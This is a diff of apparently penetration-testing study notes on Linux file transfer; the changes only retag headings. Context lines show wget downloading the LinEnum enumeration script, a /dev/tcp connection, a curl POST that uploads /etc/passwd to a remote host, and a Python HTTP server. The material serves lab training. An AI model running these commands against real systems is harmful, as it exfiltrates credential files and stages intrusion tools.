@@ -1,4 +1,5 @@
-
+[[linux]]
+[[File transfer common]]
 # Download files
 ```shell
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
@@ -14,7 +15,7 @@ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/
 ```
 
 #### Bash
-[[bash]]
+#bash
 ```shell
 h@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
 
@@ -47,7 +48,7 @@ h@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' 
 ```
 
 Python/PHP/Ruby servers:
-[[python]] [[php]] [[ruby]]
+#python #php [[ruby]]
 ```shell
 h@htb[/htb]$ python3 -m http.server
 
